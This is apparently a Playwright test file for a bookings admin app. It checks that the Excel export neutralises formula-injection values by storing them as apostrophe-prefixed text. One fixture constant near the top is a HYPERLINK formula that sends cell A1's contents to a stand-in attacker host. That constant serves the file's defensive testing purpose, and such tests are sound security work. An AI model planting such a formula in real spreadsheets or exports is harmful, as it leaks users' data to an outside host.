import { strFromU8, unzipSync } from 'fflate'
import { readFileSync } from 'node:fs'
import { booking } from './support/fixtures'
import { expect, openMenu, signIn, test } from './support/app'
import { t } from './support/i18n'

const HYPERLINK = '=HYPERLINK("http://evil.example/steal?c="&A1,"Click")'

function cellTexts(sheetXml: string): string[] {
  const unescape = (s: string) =>
    s.replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
  return [...sheetXml.matchAll(/<t(?:\s[^>]*)?>([^<]*)<\/t>/g)].map((m) => unescape(m[1]))
}

test.describe('Excel export', () => {
  test('downloads a real .xlsx whose hostile cells are neutralised with a leading apostrophe', async ({ page, api }) => {
    api.bookings = [
      booking(1, { plate_number: HYPERLINK }),
      booking(2, { plate_number: '+1+1', parking_lot: { id: booking(2).parking_lot.id, name: '@SUM(1+1)' } }),
      booking(3, { plate_number: '01A777AA' }),
    ]
    await signIn(page, api)
    await openMenu(page, 'nav.bookings')
    await expect(page.getByRole('row')).toHaveCount(4)

    const downloadPromise = page.waitForEvent('download')
    await page.getByRole('button', { name: t('export.button') }).click()
    const download = await downloadPromise

    expect(download.suggestedFilename()).toBe('bookings.xlsx')
    const path = await download.path()
    const bytes = new Uint8Array(readFileSync(path))
    // A zip (PK header) holding the OOXML parts.
    expect(Array.from(bytes.slice(0, 2))).toEqual([0x50, 0x4b])
    const files = unzipSync(bytes)
    expect(Object.keys(files)).toEqual(
      expect.arrayContaining(['[Content_Types].xml', 'xl/workbook.xml', 'xl/worksheets/sheet1.xml']),
    )
    const sheet = strFromU8(files['xl/worksheets/sheet1.xml'])
    const cells = cellTexts(sheet)

    // The malicious cell is stored as text with an apostrophe in front, never as a formula.
    expect(cells).toContain(`'${HYPERLINK}`)
    expect(cells).toContain("'+1+1")
    expect(cells).toContain("'@SUM(1+1)")
    expect(cells).toContain('01A777AA') // harmless values are untouched
    expect(cells.filter((c) => /^[=+@|%-]/.test(c) && !/^-?\d+(\.\d+)?$/.test(c))).toEqual([])
    expect(sheet).not.toMatch(/<f[ >]/) // no formula elements at all
    expect(sheet).toContain('t="inlineStr"')
    // Header row + 3 data rows; the export asked the server for all pages of the current filter.
    expect(cells[0]).toBe(t('bookings.id'))
    expect((sheet.match(/<row /g) ?? []).length).toBe(4)
    expect(api.callsTo('GET', '/admin/bookings').some((c) => c.query.page_size === '100')).toBe(true)
  })

  test('a failing export shows an error toast and offers no download', async ({ page, api }) => {
    await signIn(page, api)
    await openMenu(page, 'nav.bookings')
    await expect(page.getByRole('row')).toHaveCount(4)
    api.override('GET', '/admin/bookings', (call) => (call.query.page_size === '100' ? { status: 500, json: { detail: 'boom' } } : undefined))

    let downloaded = false
    page.on('download', () => {
      downloaded = true
    })
    await page.getByRole('button', { name: t('export.button') }).click()

    await expect(page.getByText(t('export.failed'))).toBeVisible()
    expect(downloaded).toBe(false)
  })
})
